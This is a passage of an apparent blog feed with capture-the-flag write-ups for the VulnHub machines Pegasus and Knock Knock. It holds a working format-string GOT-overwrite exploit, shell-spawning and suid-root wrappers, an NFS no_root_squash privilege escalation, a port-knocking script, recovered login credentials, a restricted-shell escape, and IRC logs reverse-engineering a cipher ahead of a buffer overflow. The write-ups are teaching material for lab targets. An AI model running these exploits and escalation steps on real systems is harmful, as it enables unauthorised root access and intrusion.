 80483bb:   e9 e0 ff ff ff          jmp    80483a0 &lt;_init+0x2c&gt;
</code></pre>

<p>So it&rsquo;s at 0x8049bfc. Now we needed to find the start of the format string on the stack. Recrudesce quickly identified it as argument number 8:</p>

<pre><code class="bash">Selection: 1

Enter first number: 5
Enter second number: AAAA%8$x
Error details: AAAA41414141
</code></pre>

<p>So I got working on an exploit. I quickly came up with this python script:</p>

<pre><code class="python">#!/usr/bin/python
import struct

def p(x):
  return struct.pack("&lt;L", x)

payload = ""

# start calculator thingie
payload += "1\n5\n"

# overwrite first part of got pointer
payload += p(0x8049bfe)
payload += "%16386c%8$hn"

# overwrite second part of got pointer
payload += p(0x8049bfc)
payload += "%20566c%12$hn"

payload += "\n"

# exit program
payload += "4\n"
print payload
</code></pre>

<p>The format string first writes some dummy bytes and then overwrites the first part of the got pointer. It takes the 8th argument off the stack and uses %hn to write a half-nibble to that address. The value is the number of bytes that have been written.</p>

<p>Then, it takes the 12th argument, which is the pointer to the second half of the got entry. It writes some dummy bytes and then the outputs the number of bytes written to the got address. Effectively, after running the exploit, the memory location at 0x8049bfc now contains 0x40069060. This is the address of system in libc after running the ulimit trick.</p>

<p>So if we run this exploit, the next time printf() will be called by the binary, it will call system() instead!</p>

<pre><code class="bash">mike@pegasus:~$ python exploit.py | ./my_first

...snip...

sh: 1: Selection:: not found

Goodbye!
</code></pre>

<p>OK, we have system() being called! So to fully exploit it and grant us a shell, we make a symlink to /bin/dash and call it &ldquo;Selection:&rdquo;. Finally we need to set the PATH environment variable so that the shell searches in the current directory and finds our symlink. The exploit is pushed to the binary via stdin and the cat command then catches the shell that is being spawned (otherwise it closes immediately).</p>

<pre><code class="bash">mike@pegasus:~$ ln -s /bin/dash Selection:
mike@pegasus:~$ export PATH=".:$PATH"
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ (python ./exploit.py; cat) | ./my_first 

...snip...

id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
</code></pre>

<p>So we now have a shell as john! I wanted to spawn another shell (using python) to get a pty, but it wouldn&rsquo;t let me:</p>

<pre><code class="bash">python -c 'import pty;pty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "&lt;string&gt;", line 1, in &lt;module&gt;
  File "/usr/lib/python2.7/pty.py", line 165, in spawn
    pid, master_fd = fork()
  File "/usr/lib/python2.7/pty.py", line 107, in fork
    master_fd, slave_fd = openpty()
  File "/usr/lib/python2.7/pty.py", line 29, in openpty
    master_fd, slave_name = _open_terminal()
  File "/usr/lib/python2.7/pty.py", line 70, in _open_terminal
    raise os.error, 'out of pty devices'
OSError: out of pty devices
</code></pre>

<p>This is probably because our little trainee &ldquo;mike&rdquo; is not a real person and is using up all our pty&rsquo;s! No problem, we thought, let&rsquo;s upload our ssh keys&hellip; only that failed, because our gid is set to mike and not john. Hmmm.. I wrote a small C wrapper to try and set gid and uid to 1000 (john) but it wouldn&rsquo;t let me set gid.</p>

<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char *argv[]){
setreuid(geteuid(), geteuid());
setregid(geteuid(), geteuid());

execv("/bin/dash", argv);
return 0;
}
</code></pre>

<p>But this did have the nice side-effect of allowing us a to spawn a pty shell!</p>

<pre><code class="bash">/tmp/a.out
id
uid=1000(john) gid=1001(mike) groups=1000(john),1001(mike)
python -c 'import pty;pty.spawn("/bin/bash")'
john@pegasus:~$ sudo -l
sudo -l
Matching Defaults entries for john on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on this host:
    (root) NOPASSWD: /usr/local/sbin/nfs
</code></pre>

<p>Nice! Now we can see that john is allowed to start the nfs daemon&hellip; Interesting, because /etc/exports lists the following entry:</p>

<pre><code class="bash">/opt/nfs    *(rw,sync,crossmnt,no_subtree_check,no_root_squash
</code></pre>

<p>no_root_squash&hellip; we can mount it remotely and have our own uid! NFS will not set it to nobody:nobody&hellip;</p>

<p>Over to recrudesce for the last bit of pwning pegasus!</p>

<hr />

<p>Before I continue, lets hear it for barrebas and his exploit dev skills.</p>

<p><img src="http://www.thepoke.co.uk/wp-content/uploads/2013/11/applause-3.gif" alt="" /></p>

<p>So, NFS huh ? What can I do with that ? <em>thinks</em>&hellip; well, I can mount it remotely and drop a file as root on my Kali box, suid the binary and execute it on Pegasus as john.</p>

<pre><code class="bash">root@kali:~# mount -t nfs 172.16.231.132:/opt/nfs /mnt/nfs
root@kali:~# cd /mnt/nfs
root@kali:/mnt/nfs# ls -la
total 8
drwxr-xr-x 2 root root 4096 Nov 18 03:43 .
drwxr-xr-x 4 root root 4096 Dec 19 13:09 ..
</code></pre>

<p>OK, so a quick side note here - my Kali box is 64 bit&hellip; if it were 32 bit I could just copy /bin/sh to /mnt/nfs and suid it. So, in this case, I have to use a C wrapper to execute a shell instead.</p>

<p>The code for the C wrapper is pretty straight forward</p>

<pre><code class="c">int main(void)
{
        system("/bin/dash");
}
</code></pre>

<p>This is then compiled as a 32 bit binary, dropped into /mnt/nfs on my Kali box, and chmodded to 4777</p>

<pre><code class="bash">root@kali:/mnt/nfs# gcc wrapper.c -m32
root@kali:/mnt/nfs# chmod 4777 a.out
</code></pre>

<p>Which, when executed as user john, drops me to a root shell</p>

<pre><code class="bash">john@pegasus:/opt/nfs$ ls -la
ls -la
total 32
drwxr-xr-x 2 root root 4096 Dec 20 00:17 .
drwxr-xr-x 5 root root 4096 Nov 18 20:51 ..
-rwsrwxrwx 1 root root 7160 Dec 20 00:17 a.out
john@pegasus:/opt/nfs$ ./moo2
./a.out
# id
uid=1000(john) gid=1001(mike) euid=0(root) groups=0(root),1001(mike)
</code></pre>

<p>Allowing the grail of grails&hellip; the ability to cat /root/flag</p>

<pre><code class="bash"># cat flag
               ,
               |`\
              /'_/_
            ,'_/\_/\_                       ,
          ,'_/\'_\_,/_                    ,'|
        ,'_/\_'_ \_ \_/                _,-'_/
      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
    ,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged
    \_`\&gt; 6` 7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
      \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
        &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/
      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
     ( ) \_ \|_  `\_    \_,/'\,_'_,/'               a video game system sold in
      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
       \_)   &gt;        `\_                           It was a hardware clone of
            /  `,      |`\_                         the Nintendo Famicom.
           /    \     / \ `\
          /   __/|   /  /  `\
         (`  (   (` (_  \   /
         /  ,/    |  /  /   \
        / ,/      | /   \   `\_
      _/_/        |/    /__/,_/
     /_(         /_( 

CONGRATULATIONS! You made it :)

Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
learnt a thing or two while doing it! :)

Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.

Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!

Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
more awesome boot2root VMs!
</code></pre>

<p><img src="http://media.tumblr.com/tumblr_m7bmngSpkh1rs4olx.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Knock Knock... Who's There ?]]></title>
    <link href="http://recrudesce.github.io/2014/10/26/knock-knock-whos-there/"/>
    <updated>2014-10-26T18:42:03+00:00</updated>
    <id>http://recrudesce.github.io/2014/10/26/knock-knock-whos-there</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/zer0w1re">zer0w1re</a> released his first VM, <a href="http://vulnhub.com/entry/knock-knock-11,105/">Knock Knock</a>, so I downloaded it and had a go (truth be told, I tested it before the public release, but this writeup is for the version available on Vulnhub.)</p>

<!-- more -->


<p><img src="http://www.quickmeme.com/img/24/24feb14fa531ddb2c9fbe31c1607f6b71e1dd30c6b5820790e8110da7f8f8d3e.jpg" alt="" /></p>

<pre><code class="bash">root@pwk:~# nmap -sS -T5 -p- -O --script banner 172.16.56.139

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-23 18:55 BST
Nmap scan report for 172.16.56.139
Host is up (0.00044s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
1337/tcp open  waste
|_banner: [57154, 48662, 9528]
MAC Address: 00:0C:29:DE:8D:33 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 3.2, Linux 3.2 - 3.10
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.00 seconds
root@pwk:~# 
</code></pre>

<p>Connecting to port 1337 results in 3 numbers.</p>

<pre><code class="bash">root@pwk:~# nc 172.16.56.139 1337
[56861, 38987, 45887]
root@pwk:~# 
</code></pre>

<p>I guess I&rsquo;m knocking some ports then.
NB: in the test version, these 3 ports were in order, in the release version they&rsquo;re randomised. So rather than knocking them in the order returned, we&rsquo;re going to have to write a python script to do all possible port orders. The fun thing here is we don&rsquo;t need to check anything after each knock attempt - we just knock the port numbers in all possible combinations and then check afterwards for any new ports.</p>

<p>I couldn&rsquo;t be bothered to write my own script, so I stole <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">Leonjza&rsquo;s</a>, as I was talking to him about it at the time</p>

<pre><code class="python">
#!/usr/bin/python

import socket
import itertools
import sys

destination = "192.168.56.203"

def clean_up_ports(raw_string):
    """ Clean up the raw string received on the socket"""
    if len(raw_string) &lt;= 0:
        return None

    # Remove the first [
    raw_string = raw_string.replace('[','')
    # Remove the second ]
    raw_string = raw_string.replace(']','')
    # split by commas
    first_list = raw_string.split(',')

    # start e empty return list
    ports = []
    for port in first_list:
        # strip the whitespace around the string
        # and cast to a integer
        ports.append(int(port.strip()))

    return  ports

def main():
    print "[+] Getting sequence"

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((destination, 1337))
    except Exception as e:
        print "[+] Unable to connect to %s on port 1337. %s" % (destination, e)
        sys.exit(1)

    # receive the list
    raw_list = sock.recv(20)

    # get the ports in a actual python list
    ports = clean_up_ports(raw_list)

    print "[+] Sequence is %s" % ports
    print "[+] Knocking on the door using all the possible combinations...\n"

    # Lets knock all of the possible combinations of the ports list
    for port_list in itertools.permutations(ports):

        print "[+] Knocking with sequence: %s" % (port_list,)
        for port in port_list:
            print "[+] Knocking on port %s:%s" % (destination,port)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((destination, port))
            sock.close()

        print "[+] Finished sequence knock\n"

if __name__ == '__main__':
    print "[+] Knock knock opener"
    main()
    print "[+] Done"
</code></pre>

<p>He&rsquo;s a clever one :P</p>

<pre><code class="bash">root@pwk:~# python knock.py
[+] Knock knock opener
[+] Getting sequence
[+] Sequence is [37430, 5311, 17504]
[+] Knocking on the door using all the possible combinations...

[+] Knocking with sequence: (37430, 5311, 17504)
[+] Knocking on port 172.16.56.139:37430
[+] Knocking on port 172.16.56.139:5311
[+] Knocking on port 172.16.56.139:17504
[+] Finished sequence knock

[+] Knocking with sequence: (37430, 17504, 5311)
[+] Knocking on port 172.16.56.139:37430
[+] Knocking on port 172.16.56.139:17504
[+] Knocking on port 172.16.56.139:5311
[+] Finished sequence knock

[+] Knocking with sequence: (5311, 37430, 17504)
[+] Knocking on port 172.16.56.139:5311
[+] Knocking on port 172.16.56.139:37430
[+] Knocking on port 172.16.56.139:17504
[+] Finished sequence knock

[+] Knocking with sequence: (5311, 17504, 37430)
[+] Knocking on port 172.16.56.139:5311
[+] Knocking on port 172.16.56.139:17504
[+] Knocking on port 172.16.56.139:37430
[+] Finished sequence knock

[+] Knocking with sequence: (17504, 37430, 5311)
[+] Knocking on port 172.16.56.139:17504
[+] Knocking on port 172.16.56.139:37430
[+] Knocking on port 172.16.56.139:5311
[+] Finished sequence knock

[+] Knocking with sequence: (17504, 5311, 37430)
[+] Knocking on port 172.16.56.139:17504
[+] Knocking on port 172.16.56.139:5311
[+] Knocking on port 172.16.56.139:37430
[+] Finished sequence knock

[+] Done
root@pwk:~#
</code></pre>

<p>Now another NMAP is required to see what opened (if anything)</p>

<pre><code class="bash">root@pwk:~/# nmap -sS -T5 --script banner 172.16.56.139

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-23 19:14 BST
Nmap scan report for 172.16.56.139
Host is up (0.00025s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
|_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
80/tcp open  http
MAC Address: 00:0C:29:DE:8D:33 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 25.87 seconds
root@pwk:~/#
</code></pre>

<p>The HTTP server is hosting a simple page, which displays an image of a door, and text asking us to look deeper.</p>

<p><a href="/images/knockknock_001.png"><img src="/images/knockknock_001.png" alt="knockknock_001" /></a></p>

<p>Now, if that&rsquo;s not an invitation to look inside the JPG, then I don&rsquo;t know what is.</p>

<pre><code class="bash">root@pwk:~# wget http://172.16.56.139/knockknock.jpg
--2014-10-23 19:17:39--  http://172.16.56.139/knockknock.jpg
Connecting to 172.16.56.139:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 84741 (83K) [image/jpeg]
Saving to: `knockknock.jpg'

100%[======================================================================================================================================================================================================&gt;] 84,741      --.-K/s   in 0s      

2014-10-23 19:17:39 (612 MB/s) - `knockknock.jpg' saved [84741/84741]

root@pwk:~# strings knockknock.jpg
JFIF
Ducky
http://ns.adobe.com/xap/1.0/
************************************ SNIP ! ************************************
qW|U
\+\U
Login Credentials
abfnW
sax2Cw9Ow
root@pwk:~#
</code></pre>

<p>Ooh, some possible credentials. They look like ROT13, so&hellip;</p>

<pre><code class="bash">root@pwk:~# python rot13.py abfnW
nosaJ
root@pwk:~#
</code></pre>

<p>OK, that&rsquo;s just Jason reversed, so I guess the same deal for the password.</p>

<pre><code class="bash">root@pwk:~# python rot13.py sax2Cw9Ow | rev
jB9jP2knf
root@pwk:~#
</code></pre>

<p>These credentials can be used to SSH into the VM, which allows us to take a quick look around.</p>

<pre><code class="bash">root@pwk:~# ssh jason@172.16.56.139
jason@172.16.56.139's password: jB9jP2knf
Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
jason@knockknock:~$ ls -l
total 8
-rwsr-xr-x 1 root jason 7457 Oct 11 18:35 tfc
jason@knockknock:~$
</code></pre>

<p>Looks like we&rsquo;re in a restricted bash shell, so lets escape that quickly</p>

<pre><code class="bash">jason@knockknock:~$ ./tfc
-rbash: ./tfc: restricted: cannot specify `/' in command names
jason@knockknock:~$ ftp
ftp&gt; !
jason@knockknock:~$ ./tfc
_______________________________
\__    ___/\_   _____/\_   ___ \
  |    |    |    __)  /    \  \/
  |    |    |     \   \     \____
  |____|    \___  /    \______  /
                \/            \/ 

    Tiny File Crypter - 1.0

Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;
jason@knockknock:~$ 
</code></pre>

<p>OK, so the next part is probably explained a lot better by reading some IRC logs.</p>

<pre><code class="text">[2014-10-10T21:51:11+0100] &lt;recrudesce&gt; hey
[2014-10-10T21:51:18+0100] &lt;recrudesce&gt; so, xcrypt
[2014-10-10T21:51:36+0100] &lt;c0ne&gt; hey
[2014-10-10T21:52:09+0100] &lt;recrudesce&gt; i see that the encryption changes based on the length
[2014-10-10T21:52:28+0100] &lt;recrudesce&gt; so i figure you can send it an ascii string that actually creates a binary
[2014-10-10T21:52:33+0100] &lt;recrudesce&gt; but it wont be suid, so not possible to run it
[2014-10-10T21:53:23+0100] &lt;c0ne&gt; as in use tfc to make a file?
[2014-10-10T21:53:50+0100] &lt;recrudesce&gt; yeah
[2014-10-10T21:54:01+0100] &lt;recrudesce&gt; cos you can work out what ascii chars will relate to the correct hex values
[2014-10-10T21:54:04+0100] &lt;recrudesce&gt; was just a thought
[2014-10-10T21:54:18+0100] &lt;c0ne&gt; hmm it was not intended
[2014-10-10T21:54:36+0100] &lt;recrudesce&gt; so if i needed a binary that was 3161 3161
[2014-10-10T21:54:42+0100] &lt;recrudesce&gt; i can just encrypt a1a1
[2014-10-10T21:54:52+0100] &lt;recrudesce&gt; and it'll create me a output with hex 3161 3161
[2014-10-10T21:54:58+0100] &lt;recrudesce&gt; just chmod +x it and run it
[2014-10-10T21:55:07+0100] &lt;recrudesce&gt; i guess i could work out what chars would result in the required hex.
[2014-10-10T21:55:12+0100] &lt;recrudesce&gt; then encrypt that to generate the binary
[2014-10-10T21:55:24+0100] &lt;c0ne&gt; could i push you allite bit ahead?
[2014-10-10T21:55:30+0100] &lt;c0ne&gt; into some other road..
[2014-10-10T21:55:35+0100] &lt;recrudesce&gt; but what's the point, cos i am only able to run that as jason
[2014-10-10T21:55:42+0100] &lt;recrudesce&gt; so, it's something to do with xcrypt
[2014-10-10T21:55:55+0100] &lt;recrudesce&gt; need to send something to xcrypt to make it create, or execute something
[2014-10-10T21:55:57+0100] &lt;c0ne&gt; its a kinda classic vuln...
[2014-10-10T21:56:11+0100] &lt;recrudesce&gt; so either buffer overflow or formatstr
[2014-10-10T21:56:16+0100] &lt;recrudesce&gt; please dont let it be formatstr
[2014-10-10T21:56:19+0100] &lt;c0ne&gt; first one
[2014-10-10T21:56:22+0100] &lt;c0ne&gt; simple bof
[2014-10-10T21:56:27+0100] &lt;c0ne&gt; but...
[2014-10-10T21:56:55+0100] &lt;c0ne&gt; you need to figure out this xcrypt in order to be able to encrypt your payload
[2014-10-10T21:57:47+0100] &lt;c0ne&gt; also regarding
[2014-10-10T21:57:48+0100] &lt;c0ne&gt; [22:52] &lt;recrudesce&gt; i see that the encryption changes based on the length
[2014-10-10T21:57:55+0100] &lt;c0ne&gt; yes and no...
[2014-10-10T21:58:12+0100] &lt;c0ne&gt; the key will change depending on the length
[2014-10-10T22:03:01+0100] &lt;c0ne&gt; basically it's a four byte key created from some init values and changes every time after crypting 4 bytes
[2014-10-10T22:03:56+0100] &lt;recrudesce&gt; i can make it  segfault by passing it 1000 a's
[2014-10-10T22:04:00+0100] &lt;recrudesce&gt; but only on the box
[2014-10-10T22:04:02+0100] &lt;recrudesce&gt; not on my kali
[2014-10-10T22:05:57+0100] &lt;c0ne&gt; 1000 a's kinda suprisses me
[2014-10-10T22:06:09+0100] &lt;c0ne&gt; since the buffer is bigger
[2014-10-10T22:06:21+0100] &lt;recrudesce&gt; i seg faulted it on 1000 a's
[2014-10-10T22:06:45+0100] &lt;c0ne&gt; k
[2014-10-10T22:06:51+0100] &lt;c0ne&gt; try something like 5000
[2014-10-10T22:08:26+0100] &lt;recrudesce&gt; ok, i made it crash
[2014-10-10T22:08:43+0100] &lt;recrudesce&gt; 725cce63
[2014-10-10T22:08:48+0100] &lt;recrudesce&gt; but it's not in the pattern cos it's encrypting it
[2014-10-10T22:08:56+0100] &lt;c0ne&gt; exactly
[2014-10-10T22:11:35+0100] &lt;recrudesce&gt; you're evil
[2014-10-10T22:11:45+0100] &lt;c0ne&gt; motherless child
[2014-10-10T22:12:15+0100] &lt;recrudesce&gt; is the original key based off a static init value
[2014-10-10T22:12:17+0100] &lt;recrudesce&gt; or a dynamic one
[2014-10-10T22:12:24+0100] &lt;c0ne&gt; static
[2014-10-10T22:12:26+0100] &lt;c0ne&gt; also
[2014-10-10T22:12:31+0100] &lt;recrudesce&gt; so the first key is always the same
[2014-10-10T22:12:33+0100] &lt;c0ne&gt; xcrypt is one way
[2014-10-10T22:12:49+0100] &lt;c0ne&gt; so it either encrypts or decrypts
[2014-10-10T22:14:10+0100] &lt;c0ne&gt; basicly what is does it
[2014-10-10T22:14:53+0100] &lt;c0ne&gt; creates a 4byte key(dword) crypts a block of 4 bytes(dword) and then changes the key based on another static value
[2014-10-10T22:15:18+0100] &lt;c0ne&gt; and its keeps changing for every loop round
[2014-10-10T22:15:47+0100] &lt;recrudesce&gt; so essentially the key is the same on first loop
[2014-10-10T22:15:52+0100] &lt;recrudesce&gt; and same on 2nd loop ?
[2014-10-10T22:15:56+0100] &lt;c0ne&gt; also on the next
[2014-10-10T22:16:00+0100] &lt;c0ne&gt; and so on...
[2014-10-10T22:16:06+0100] &lt;recrudesce&gt; so no matter what i send it length wise, the 1st key is ALWAYS the same
[2014-10-10T22:16:09+0100] &lt;recrudesce&gt; and so is the 2nd key
[2014-10-10T22:16:12+0100] &lt;c0ne&gt; its a simple math mutation
[2014-10-10T22:16:21+0100] &lt;recrudesce&gt; gotta work out how you generate the 2nd key
[2014-10-10T22:16:27+0100] &lt;recrudesce&gt; work out what the first key is too
[2014-10-10T22:16:41+0100] &lt;c0ne&gt; there is only one key
[2014-10-10T22:16:41+0100] &lt;recrudesce&gt; then you can work out what the algorithm is to generate the keys
[2014-10-10T22:16:47+0100] &lt;recrudesce&gt; yeah, but you mutate it
[2014-10-10T22:16:53+0100] &lt;c0ne&gt; thats exactly what you need to do
[2014-10-10T22:17:16+0100] &lt;c0ne&gt; see how the key is build and mutates
[2014-10-10T22:18:28+0100] &lt;recrudesce&gt; v3 is the key
[2014-10-10T22:18:35+0100] &lt;recrudesce&gt; in pseudo-c
[2014-10-10T22:18:49+0100] &lt;recrudesce&gt; v3 = -367349345
[2014-10-10T22:19:00+0100] &lt;c0ne&gt; make it hex please
[2014-10-10T22:20:52+0100] &lt;recrudesce&gt; -0x15E54E61
[2014-10-10T22:21:24+0100] &lt;c0ne&gt; yeah i just checked it
[2014-10-10T22:21:30+0100] &lt;c0ne&gt; its the init value indeed
[2014-10-10T22:21:47+0100] &lt;recrudesce&gt; ok, so the first key is 0x15E54E61 ?
[2014-10-10T22:21:53+0100] &lt;recrudesce&gt; represented as an unsigned int
[2014-10-10T22:21:58+0100] &lt;c0ne&gt; no
[2014-10-10T22:22:05+0100] &lt;c0ne&gt; unsigned indeed
[2014-10-10T22:22:11+0100] &lt;c0ne&gt; you show signed now
[2014-10-10T22:22:57+0100] &lt;recrudesce&gt; ah, so signed -367349345 (15E54E61) is EA1AB19F unsigned ?
[2014-10-10T22:23:04+0100] &lt;c0ne&gt; yes
[2014-10-10T22:23:06+0100] &lt;c0ne&gt; in ida
[2014-10-10T22:23:09+0100] &lt;c0ne&gt; press h
[2014-10-10T22:23:16+0100] &lt;c0ne&gt; when the value selected iirc
[2014-10-10T22:24:48+0100] &lt;recrudesce&gt; but it shows 3927617951, not -367349345
[2014-10-10T22:24:54+0100] &lt;recrudesce&gt; or am i being stupid ?
[2014-10-10T22:25:05+0100] &lt;c0ne&gt; and when you press h again
[2014-10-10T22:25:19+0100] &lt;recrudesce&gt; EA1AB19F
[2014-10-10T22:25:24+0100] &lt;recrudesce&gt; but why is the signed different ?
[2014-10-10T22:26:00+0100] &lt;c0ne&gt; it isnt
[2014-10-10T22:26:05+0100] &lt;c0ne&gt; its the same value
[2014-10-10T22:26:26+0100] &lt;recrudesce&gt; ok, i'm confused
[2014-10-10T22:26:37+0100] &lt;recrudesce&gt; in decompiled it shows as -367349345
[2014-10-10T22:26:38+0100] &lt;c0ne&gt; open win calc
[2014-10-10T22:26:52+0100] &lt;c0ne&gt; trow -367349345 in
[2014-10-10T22:26:57+0100] &lt;c0ne&gt; and switch to hex
[2014-10-10T22:27:03+0100] &lt;c0ne&gt; you will see
[2014-10-10T22:27:22+0100] &lt;recrudesce&gt; FFFFFFFEA1AB19F
[2014-10-10T22:27:30+0100] &lt;c0ne&gt; set it to dword
[2014-10-10T22:27:38+0100] &lt;c0ne&gt; strips the left 32 bits
[2014-10-10T22:27:40+0100] &lt;recrudesce&gt; ah ok
[2014-10-10T22:27:42+0100] &lt;recrudesce&gt; yeah, sorry
[2014-10-10T22:28:12+0100] &lt;recrudesce&gt; so that's the key in hex which is used as the key for the first 4 bytes
[2014-10-10T22:28:28+0100] &lt;recrudesce&gt; then something is happening to that hex value to make the next key
[2014-10-10T22:28:30+0100] &lt;c0ne&gt; its the base value indeed
[2014-10-10T22:28:35+0100] &lt;c0ne&gt; yes
[2014-10-10T22:29:31+0100] &lt;recrudesce&gt; ok, so it looks like you're putting that value into ebp+ -0Ch
[2014-10-10T22:30:25+0100] &lt;recrudesce&gt; looks like you're shifting it by 8
[2014-10-10T22:30:37+0100] &lt;recrudesce&gt; possibly ?
[2014-10-10T22:30:52+0100] &lt;c0ne&gt; more like shifting it by 1 , 8 times
[2014-10-10T22:31:21+0100] &lt;recrudesce&gt; what's the difference between shifting it by 1 8 times or shifting it by 8
[2014-10-10T22:32:42+0100] &lt;c0ne&gt; a2 &gt;&gt; 2
[2014-10-10T22:32:48+0100] &lt;c0ne&gt; is the same as
[2014-10-10T22:32:52+0100] &lt;c0ne&gt; a2 / 4
[2014-10-10T22:33:09+0100] &lt;recrudesce&gt; ok
[2014-10-10T22:35:15+0100] &lt;recrudesce&gt; bitwise operations
[2014-10-10T22:35:24+0100] &lt;c0ne&gt; yes
[2014-10-10T22:37:29+0100] &lt;recrudesce&gt; so this key, is it used as hex ?
[2014-10-10T22:37:36+0100] &lt;recrudesce&gt; or converted to something before use ?
[2014-10-10T22:38:28+0100] &lt;c0ne&gt; hex is only a presentation
[2014-10-10T22:38:41+0100] &lt;c0ne&gt; if you get me?
[2014-10-10T22:38:46+0100] &lt;recrudesce&gt; yeah
[2014-10-10T22:38:58+0100] &lt;recrudesce&gt; i'm just trying to work out how this xcrypt works
[2014-10-10T22:38:59+0100] &lt;c0ne&gt; its 32 bits value
[2014-10-10T22:40:14+0100] &lt;c0ne&gt; in assembly you cant realy determ how the value is intended
[2014-10-10T22:40:31+0100] &lt;c0ne&gt; signed or unsigned
[2014-10-10T22:40:45+0100] &lt;c0ne&gt; ah signed value ranges from 0 till 80000000
[2014-10-10T22:41:00+0100] &lt;c0ne&gt; where a unsigned ranges from 0 to ffffffff
[2014-10-10T22:42:59+0100] &lt;recrudesce&gt; i'm still trying to fathom out this xcrypt func
[2014-10-10T22:43:06+0100] &lt;c0ne&gt; normally the code kinda tells you how the value was intended
[2014-10-10T22:43:10+0100] &lt;recrudesce&gt; so it's taking file size, dividing by 4
[2014-10-10T22:43:13+0100] &lt;recrudesce&gt; looping that many times
[2014-10-10T22:43:30+0100] &lt;recrudesce&gt; *(_DWORD *)(a1 + 4 * i) = v3 ^ *(_DWORD *)(4 * i + a1);
[2014-10-10T22:43:40+0100] &lt;recrudesce&gt; for ( j = 0; j &lt;= 7; ++j )
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt; {
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;       if ( v3 &amp; 1 )
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;         v3 = ((unsigned int)v3 &gt;&gt; 1) ^ 0x6DAA1CF4;
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;       else
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;         v3 = (unsigned int)v3 &gt;&gt; 1;
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;     }
[2014-10-10T22:43:49+0100] &lt;recrudesce&gt;   }
[2014-10-10T22:44:02+0100] &lt;c0ne&gt; hmm dress up you ida abit more
[2014-10-10T22:44:07+0100] &lt;c0ne&gt; for example
[2014-10-10T22:44:21+0100] &lt;c0ne&gt; select a1 and press y
[2014-10-10T22:44:25+0100] &lt;c0ne&gt; and change it to
[2014-10-10T22:44:32+0100] &lt;c0ne&gt; _DWORD *a1
[2014-10-10T22:44:40+0100] &lt;recrudesce&gt; hang on, i need to find a1
[2014-10-10T22:44:53+0100] &lt;c0ne&gt; in the function params
[2014-10-10T22:44:58+0100] &lt;c0ne&gt; int __cdecl xcrypt(_DWORD *a1, unsigned int a2)
[2014-10-10T22:45:13+0100] &lt;recrudesce&gt; my pseudocode is in a file
[2014-10-10T22:45:27+0100] &lt;c0ne&gt; aah that wont help then
[2014-10-10T22:45:31+0100] &lt;recrudesce&gt; ok, now it's in ida
[2014-10-10T22:45:35+0100] &lt;c0ne&gt; since the rest isnt changed then
[2014-10-10T22:46:07+0100] &lt;recrudesce&gt; ok, so i did that
[2014-10-10T22:46:32+0100] &lt;c0ne&gt; [23:43] &lt;recrudesce&gt; *(_DWORD *)(a1 + 4 * i) = v3 ^ *(_DWORD *)(4 * i + a1);
[2014-10-10T22:46:38+0100] &lt;recrudesce&gt; now shows as a1[1] ^= v3
[2014-10-10T22:46:39+0100] &lt;c0ne&gt; that looks abit better now i think?
[2014-10-10T22:46:40+0100] &lt;c0ne&gt; yes
[2014-10-10T22:46:46+0100] &lt;c0ne&gt; hmm
[2014-10-10T22:46:57+0100] &lt;c0ne&gt; now shows as a1[1] ^= v3 that a 1? in the array?
[2014-10-10T22:47:06+0100] &lt;recrudesce&gt; sorry, i
[2014-10-10T22:47:11+0100] &lt;c0ne&gt; k
